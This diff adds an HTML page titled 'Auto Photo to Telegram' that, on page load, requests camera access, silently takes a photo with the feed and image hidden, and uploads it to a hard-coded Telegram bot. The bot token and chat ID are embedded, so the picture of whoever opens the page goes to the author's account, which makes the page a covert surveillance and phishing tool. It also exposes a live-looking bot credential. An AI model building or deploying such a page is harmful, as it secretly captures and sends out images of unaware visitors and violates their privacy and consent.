@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Photo to Telegram</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .container {
+            background-color: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        video {
+            display: none; /* Always hidden: camera feed will not be shown */
+        }
+        canvas {
+            display: none; /* Canvas is used for capturing, not direct display */
+            visibility: hidden;
+        img {
+            display: none; /* Always hidden: captured photo will not be shown on the page */
+        }
+        .message-box {
+            background-color: #fff3cd;
+            color: #664d03;
+            padding: 15px;
+            border: 1px solid #ffecb5;
+            border-radius: 8px;
+            margin-top: 20px;
+            text-align: left;
+            width: 100%;
+        }
+        .loading-spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-left-color: #3498db;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin-top: 20px;
+            display: none; /* Hidden by default */
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .permission-text {
+            font-size: 1rem;
+            color: #555;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 class="text-3xl font-bold text-gray-800 mb-4">Auto Photo to Telegram</h1>
+        <p class="permission-text">
+            Please allow camera access. A photo will be taken and sent directly to your Telegram bot.
+            Neither the camera feed nor the photo will be displayed on this page.
+        </p>
+        <video id="videoElement" autoplay playsinline></video>
+        <canvas id="canvasElement"></canvas>
+        <img id="photoOutput" alt="Captured Photo" class="hidden">
+        <div id="messageBox" class="message-box hidden"></div>
+        <div id="loadingSpinner" class="loading-spinner"></div>
+    </div>
+
+    <script>
+        const video = document.getElementById('videoElement');
+        const canvas = document.getElementById('canvasElement');
+        const photoOutput = document.getElementById('photoOutput'); // Kept for consistency, but will remain hidden
+        const messageBox = document.getElementById('messageBox');
+        const loadingSpinner = document.getElementById('loadingSpinner');
+        let stream = null; // To store the camera stream
+
+        // --- Telegram Bot Configuration ---
+        // REPLACE 'YOUR_CHAT_ID' with your actual Telegram chat ID.
+        // To get your chat ID:
+        // 1. Start a conversation with your bot (e.g., send /start)
+        // 2. Open this URL in your browser, replacing <YOUR_BOT_TOKEN> with your bot's token:
+        //    https://api.telegram.org/bot7928769425:AAGCLo0JY_7I489q09AbEp6LiIDLvsO980A/getUpdates
+        // 3. Look for the 'id' value inside the 'chat' object in the JSON response.
+        const TELEGRAM_BOT_TOKEN = '7928769425:AAGCLo0JY_7I489q09AbEp6LiIDLvsO980A';
+        const TELEGRAM_CHAT_ID = '509478224'; // Example: user needs to replace this with their actual chat_id
+
+        /**
+         * Displays a message in the message box.
+         * @param {string} message - The message to display.
+         * @param {boolean} isError - True if it's an error message (red background), false for success/info (green/yellow background).
+         */
+        function showMessage(message, isError = false) {
+            messageBox.textContent = message;
+            if (isError) {
+                messageBox.className = 'message-box bg-red-100 text-red-700 border-red-200';
+            } else {
+                messageBox.className = 'message-box bg-green-100 text-green-700 border-green-200';
+            }
+            messageBox.classList.remove('hidden');
+            loadingSpinner.style.display = 'none'; // Hide spinner on message
+        }
+
+        /**
+         * Hides the message box.
+         */
+        function hideMessage() {
+            messageBox.classList.add('hidden');
+        }
+
+        /**
+         * Starts the camera stream, captures a photo, and then sends it to Telegram.
+         */
+        async function startCameraAndProcessPhoto() {
+            loadingSpinner.style.display = 'block'; // Show spinner
+            hideMessage(); // Hide any previous messages
+
+            if (TELEGRAM_CHAT_ID === '-1002010834388' || !TELEGRAM_CHAT_ID) {
+                showMessage("Please update TELEGRAM_CHAT_ID in the script with your actual Telegram chat ID to send the photo.", true);
+                loadingSpinner.style.display = 'none';
+                return;
+            }
+
+            try {
+                showMessage("Requesting camera access...", false);
+                // Request access to the user's camera
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+
+                // Wait for the video to load enough metadata to know its dimensions
+                video.onloadedmetadata = () => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+
+                    // Give a small delay to ensure the video stream is stable before capturing
+                    setTimeout(() => {
+                        capturePhoto();
+                        loadingSpinner.style.display = 'none'; // Hide spinner after capture attempt
+                    }, 500); // 0.5 second delay
+                };
+
+            } catch (err) {
+                console.error("Error accessing camera: ", err);
+                loadingSpinner.style.display = 'none'; // Hide spinner on error
+                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+                    showMessage("Camera access denied. Please allow camera permissions to use this feature.", true);
+                } else if (err.name === 'NotFoundError') {
+                    showMessage("No camera found on this device.", true);
+                } else {
+                    showMessage("Could not access camera. Error: " + err.message, true);
+                }
+            }
+        }
+
+        /**
+         * Captures a photo from the video stream, converts it to a Data URL, and sends it to Telegram.
+         */
+        function capturePhoto() {
+            if (!stream) {
+                showMessage("No camera stream available to capture photo.", true);
+                return;
+            }
+
+            const context = canvas.getContext('2d');
+            // Draw the current video frame onto the canvas
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Get the image data from the canvas as a Data URL
+            const dataUrl = canvas.toDataURL('image/png');
+
+            // Stop the video stream immediately after capturing
+            if (stream) {
+                const tracks = stream.getTracks();
+                tracks.forEach(track => track.stop());
+                video.srcObject = null; // Disconnect stream from video element
+            }
+
+            // Send the captured photo to Telegram
+            sendPhotoToTelegram(dataUrl);
+        }
+
+        /**
+         * Sends the photo to a Telegram bot.
+         * @param {string} dataUrl - The base64 Data URL of the image.
+         */
+        async function sendPhotoToTelegram(dataUrl) {
+            loadingSpinner.style.display = 'block'; // Show spinner for sending
+            showMessage("Photo captured. Sending to Telegram...", false);
+
+            try {
+                // Convert Data URL to Blob for FormData upload
+                const response = await fetch(dataUrl);
+                const blob = await response.blob();
+
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', blob, 'camera_capture.png'); // 'camera_capture.png' is the filename for Telegram
+
+                const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+
+                const telegramResponse = await fetch(telegramApiUrl, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                const result = await telegramResponse.json();
+
+                if (result.ok) {
+                    showMessage("Photo sent to Telegram successfully!", false);
+                } else {
+                    showMessage(`Failed to send photo to Telegram. Error: ${result.description || 'Unknown error'}`, true);
+                    console.error("Telegram API Error:", result);
+                }
+            } catch (error) {
+                console.error("Error sending photo to Telegram:", error);
+                showMessage(`Error sending photo to Telegram: ${error.message}`, true);
+            } finally {
+                loadingSpinner.style.display = 'none'; // Hide spinner after sending attempt
+            }
+        }
+
+        // Automatically start the camera and process the photo when the page loads
+        window.onload = startCameraAndProcessPhoto;
+    </script>
+</body>
+</html>
